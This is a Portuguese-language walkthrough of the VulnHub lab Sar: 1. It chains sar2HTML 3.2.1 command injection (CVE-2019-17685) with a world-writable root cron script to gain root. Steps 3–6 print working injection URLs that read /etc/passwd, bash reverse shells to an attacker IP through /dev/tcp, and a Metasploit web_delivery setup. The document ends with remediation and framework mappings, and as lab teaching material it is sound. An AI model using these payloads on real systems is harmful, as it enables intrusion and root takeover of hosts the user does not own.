# Sar: 1 — Quando a Ferramenta de Monitoramento Vira a Superfície de Ataque

Olha só, rapaziada!! Essa é elegante na simplicidade. Sar: 1 ensina duas lições limpas uma atrás da outra: o sar2HTML 3.2.1 tem RCE não autenticado via injeção de comando no parâmetro `plot` (CVE-2019-17685), e depois tem um script shell executado por cron que é gravável pelo www-data. Duas vulnerabilidades, ambas trivialmente exploráveis, juntas entregam root a partir de uma única página web. Sem armadilhas, sem adivinhação: encontre o serviço, explore o CVE conhecido e injete no script de cron. Exatamente o tipo de cadeia que você encontra em engajamentos reais. Máquina top demais para iniciantes.

| Campo | Valor |
|---|---|
| **Nível** | Fácil |
| **VM Alvo** | Sar: 1 |
| **VM Atacante** | Kali Linux 2024.x |
| **VulnHub URL** | https://www.vulnhub.com/entry/sar-1,425/ |
| **Técnicas** | Nmap, enumeração robots.txt, RCE sar2HTML (CVE-2019-17685), Metasploit web_delivery, shell www-data, injeção em script de cron, reverse shell para root |
| **CVEs** | CVE-2019-17685 (sar2HTML 3.2.1: injeção de comando via parâmetro plot, RCE não autenticado) |
| **Grupos APT** | APT41: conhecido pela exploração rápida de CVEs recém-divulgados em ferramentas de monitoramento e gerenciamento para acesso inicial em ambientes empresariais; Lazarus Group: usa vulnerabilidades em aplicações web como vetores de acesso inicial antes de implantar payloads de roubo de credenciais e persistência |

---

## Resumo do Ataque

```
nmap -p- -A
  |
  +-- porta 80 HTTP (Apache)
        |
        +-- robots.txt -> /sar2html
              |
              +-- sar2HTML 3.2.1 -> CVE-2019-17685
                    |
                    +-- ?plot=;id -> RCE como www-data
                          |
                          +-- Metasploit web_delivery -> reverse shell
                                |
                                +-- encontra cron + finally.sh gravável
                                      |
                                      +-- injeta reverse shell -> cron executa como root
                                            |
                                            +-- shell root
                                                  |
                                                  +-- /root/root.txt
```

---

## Metodologia

1. Descoberta de rede e scan de portas: única porta 80
2. Enumeração web: robots.txt revela `/sar2html`
3. Fingerprint da versão do sar2HTML (3.2.1): vulnerável ao CVE-2019-17685
4. Exploração via injeção de comando no parâmetro `plot`
5. Entrega de reverse shell usando o módulo web_delivery do Metasploit
6. Pós-exploração: encontrar cron jobs e scripts graváveis
7. Injetar payload de reverse shell no script executado pelo cron
8. Aguardar execução do cron para obter shell root

---

## Passo 1 — Descoberta de Rede e Scan de Portas

```bash
sudo netdiscover -r 192.168.29.0/24
# Alvo: 192.168.29.212

nmap -p- -A 192.168.29.212
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29
```

Apenas HTTP. Sem SSH, sem FTP. Toda a superfície de ataque é a aplicação web. Isso simplifica a enumeração: aprofunde no HTTP.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Enumeração Web

Navegue até `http://192.168.29.212/`. Verifique robots.txt primeiro (sempre faça isso antes de rodar ferramentas):

```bash
curl http://192.168.29.212/robots.txt
```

```
User-agent: *
Disallow: /sar2html
```

O `robots.txt` está dizendo para os crawlers não indexarem `/sar2html`. Para um atacante CTF, isso é um convite explícito. Navegue para:

```
http://192.168.29.212/sar2html
```

Isso revela o sar2HTML, um visualizador web para dados `sar` (System Activity Report) do Linux. A versão 3.2.1 é exibida no rodapé da interface.

**Nota do mundo real:** robots.txt nunca deve ser usado para esconder caminhos sensíveis. É um documento público: todo crawler de mecanismo de busca e todo atacante o lê primeiro. Esconder painéis administrativos ou ferramentas de monitoramento atrás do robots.txt não oferece nenhuma segurança e ainda aponta ativamente os atacantes para os endpoints interessantes.

**MITRE ATT&CK:** T1595.003 — Varredura Ativa: Wordlist Scanning; T1083 — Descoberta de Arquivos e Diretórios

---

## Passo 3 — CVE-2019-17685: Injeção de Comando no sar2HTML

O sar2HTML 3.2.1 passa o parâmetro GET `plot` diretamente para um comando shell sem sanitização. Isso permite injeção de comando não autenticada.

Verifique a vulnerabilidade manualmente:

```bash
curl "http://192.168.29.212/sar2html/index.php?plot=;id"
# Saída inclui: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

A saída do comando `id` aparece no HTML de resposta, confirmando RCE como `www-data`.

Também teste para acessar arquivos:

```bash
curl "http://192.168.29.212/sar2html/index.php?plot=;cat+/etc/passwd"
# Revela usuários do sistema
```

**Nota do mundo real:** sar2HTML foi projetado para uso em rede interna, não para exposição na internet. O CVE-2019-17685 afeta o parâmetro `plot` que renderiza gráficos de desempenho. Ferramentas de monitoramento não autenticadas com execução de comandos são encontradas consistentemente em avaliações internas, especialmente em servidores Linux onde administradores instalam utilitários de desempenho e esquecem que são acessíveis via web.

**MITRE ATT&CK:** T1190 — Exploração de Aplicação Voltada para Internet; T1059.004 — Interpretador de Scripts: Shell Unix

---

## Passo 4 — Reverse Shell via Metasploit web_delivery

Inicie um listener Metasploit e use web_delivery para obter uma shell estável:

```bash
msfconsole
use exploit/multi/script/web_delivery
set TARGET 7         # Linux/Python
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST <ip_atacante>
set LPORT 4444
run
```

O Metasploit gera um comando curl para executar. Entregue via o CVE:

```bash
# Encode a URL do comando curl da saída do web_delivery
# Injete via parâmetro plot:
curl "http://192.168.29.212/sar2html/index.php?plot=;<comando_web_delivery_encodado>"
```

Alternativamente, use uma bash reverse shell mais simples:

```bash
# Inicie listener:
nc -lvnp 4444

# Injete via CVE:
curl "http://192.168.29.212/sar2html/index.php?plot=;bash+-c+'bash+-i+>%26+/dev/tcp/<ip_atacante>/4444+0>%261'"
```

Você recebe um callback como `www-data`. Estabilize imediatamente:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z -> stty raw -echo; fg -> Enter duas vezes
```

**MITRE ATT&CK:** T1059.004 — Shell Unix; T1071.001 — Protocolo de Camada de Aplicação: Web

---

## Passo 5 — Pós-Exploração: Encontrar Cron Jobs e Scripts Graváveis

Enumere cron jobs:

```bash
cat /etc/crontab
ls -la /etc/cron*
crontab -l 2>/dev/null
```

Encontre em `/etc/crontab` ou similar:

```
*/5 * * * * root /var/www/html/finally.sh
```

Root executa `finally.sh` a cada 5 minutos. Verifique se é gravável:

```bash
ls -la /var/www/html/finally.sh
# -rwxrwxrwx 1 www-data www-data ... /var/www/html/finally.sh
# OU
# gravável pelo grupo www-data
```

Este é o vetor de escalonamento de privilégios. O script é gravável pelo `www-data` (nosso usuário atual) e é executado como root via cron.

**Nota do mundo real:** Scripts de cron graváveis por contas de serviço são um dos top 5 achados de escalação de privilégios Linux em pentests reais. Isso acontece quando desenvolvedores definem permissões desleixadamente durante a configuração inicial. O cron está corretamente restrito (roda como root), mas o arquivo do script tem permissões de escrita global, o que derrota completamente a restrição.

**MITRE ATT&CK:** T1053.003 — Tarefa Agendada: Cron; T1083 — Descoberta de Arquivos e Diretórios

---

## Passo 6 — Injetar Reverse Shell e Aguardar Root

Anexe um payload de reverse shell ao script de cron:

```bash
# Inicie um segundo listener:
nc -lvnp 9999

# Injete no script:
echo "bash -i >& /dev/tcp/<ip_atacante>/9999 0>&1" >> /var/www/html/finally.sh
```

Aguarde até 5 minutos pelo cron job disparar. Quando executar como root, você recebe o callback:

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
```

Sensacional! Root. Limpo, simples, satisfatório.

**MITRE ATT&CK:** T1548.003 — Abuso de Controle de Elevação: Sudo (variante de abuso de cron); T1053.003 — Tarefa Agendada: Cron

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado em | Usado/Quebrado |
|---|---|---|---|
| Flag de usuário | (varia) | /home/love/Desktop/user.txt | Acesso shell www-data |
| Prova de RCE | uid=33(www-data) | CVE-2019-17685 via parâmetro plot | Injeção de comando sar2html |
| Flag root | (varia) | /root/root.txt | Injeção no script de cron |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Lição Principal |
|---|---|---|---|
| 1 | robots.txt revelando ferramenta de monitoramento oculta | robots.txt é um arquivo público lido por crawlers e atacantes; ativamente destaca endpoints que você quer esconder | Nunca esconda caminhos sensíveis no robots.txt; implemente controle de acesso adequado |
| 2 | RCE não autenticado no sar2HTML 3.2.1 (CVE-2019-17685) | Ferramentas de monitoramento e desempenho são consistentemente negligenciadas nos programas de hardening | Mantenha ferramentas de monitoramento fora de interfaces públicas; exija autenticação; atualize para versões corrigidas |
| 3 | Script de cron gravável por usuário de serviço web | Scripts de cron graváveis são um dos top-5 achados de escalação de privilégios Linux em pentests reais | Scripts de cron devem ser de propriedade do root e não graváveis por outros; audite com: find /etc/cron* -writable 2>/dev/null |
| 4 | Único serviço HTTP como toda a superfície de ataque | Redes com poucos serviços expostos são mais fáceis de defender, mas uma única aplicação web vulnerável é suficiente para comprometimento total | Defesa em profundidade: hardening da aplicação web E do SO subjacente; monitoramento de integridade de arquivos em scripts de cron |
| 5 | Intervalo de cron de cinco minutos: espera curta para root | Privesc baseada em tempo (cron jobs, timers systemd) é confiável e comum em ambientes reais | Audite todos os cron jobs e timers systemd em todo host Linux avaliado |

---

## MITRE ATT&CK

| Fase | Tática | Técnica | ID |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Reconhecimento | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Acesso Inicial | Acesso Inicial | Exploração de Aplicação Voltada para Internet | T1190 |
| Execução | Execução | Interpretador de Scripts: Shell Unix | T1059.004 |
| Execução | Execução | Tarefa Agendada: Cron | T1053.003 |
| Comando e Controle | C2 | Protocolo de Camada de Aplicação: Web | T1071.001 |
| Escalação de Privilégios | Escalação de Privilégios | Tarefa Agendada: Cron (script gravável) | T1053.003 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Faça patch do sar2HTML** — atualize para versão que sanitize o parâmetro `plot`; ou remova a aplicação se não for necessária
2. **Restrinja acesso ao sar2HTML** — coloque atrás de autenticação; restrinja a rede interna apenas; nunca exponha em interfaces públicas
3. **Corrija o robots.txt** — remova caminhos sensíveis do robots.txt; implemente controle de acesso adequado
4. **Hardening das permissões de scripts de cron** — todos os scripts executados por cron devem ser: propriedade do root, modo 750 (rwxr-x---), não graváveis por nenhuma conta de serviço
5. **Monitore integridade de scripts de cron** — use monitoramento de integridade de arquivos (AIDE, Wazuh FIM) em todos os scripts executados por cron

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gestão de Ativos | Inventariar todas as ferramentas de monitoramento e utilitários acessíveis via web |
| Proteger | Tecnologia de Proteção | Autenticar sar2HTML; restringir à rede interna |
| Proteger | Segurança de Dados | Corrigir permissões de scripts de cron; aplicar propriedade de menor privilégio |
| Detectar | Anomalias e Eventos | Alertas FIM em scripts de cron; alertar sobre novos scripts PHP/bash no web root |
| Responder | Planejamento de Resposta | Remover sar2HTML; rotacionar credenciais da conta de serviço comprometida |
| Recuperar | Planejamento de Recuperação | Reconstruir host; rebaseline da configuração de cron |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-3 | Controle de Acesso | Autenticar ferramentas de monitoramento acessíveis via web |
| AC-6 | Menor Privilégio | Scripts de cron de propriedade do root, não graváveis por contas de serviço |
| CM-7 | Menor Funcionalidade | Expor ferramentas de monitoramento apenas em redes internas |
| SI-2 | Remediação de Falhas | Patch CVE-2019-17685 (sar2HTML RCE) |
| SI-7 | Integridade de Software | FIM em scripts executados por cron |

### CISA KEV

CVE-2019-17685 é uma vulnerabilidade ativamente explorada no sar2HTML. Ferramentas de monitoramento com vulnerabilidades RCE conhecidas são destacadas em múltiplos alertas CISA (AA20-245A, AA22-074A) como vetores comuns de acesso inicial em intrusões empresariais.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gestão de Ameaças e Vulnerabilidades (THREAT) | Gerenciar Vulnerabilidades | MIL2 (patch CVE-2019-17685; adicionar ao escopo de varredura) |
| Gestão de Ativos (ASSET) | Gerenciar Software | MIL2 (inventário de ferramentas de monitoramento; rastrear versões) |
| Conscientização Situacional (SITUATION) | Monitorar | MIL2 (FIM em scripts de cron; alertar sobre mudanças no web root) |

### MITRE D3FEND

- **D3-ACH** — Hardening de Configuração de Aplicação: autenticar sar2HTML; remover da internet pública; patch CVE-2019-17685
- **D3-FIM** — Monitoramento de Integridade de Arquivos: monitorar scripts de cron e web root para mudanças não autorizadas
- **D3-OAM** — Gerenciamento Administrativo do SO: corrigir permissões de scripts de cron; apenas propriedade root

---

## Pensamentos Finais

Sar: 1 é uma das cadeias mais limpas para iniciantes no VulnHub. Duas vulnerabilidades, um CVE conhecido e um script de cron mal configurado, encadeadas para ir do nada ao root. Cada passo é realista e mapeia diretamente para achados em pentests Linux reais.

A máquina ensina dois hábitos que ficam: leia robots.txt antes de rodar ferramentas, e sempre verifique cron jobs em busca de scripts graváveis. Ambos levam menos de 30 segundos e capturam achados reais em sistemas reais.

Muito respeito ao criador por manter tudo preciso.

Thanks guys!! (❍ᴥ❍ʋ)
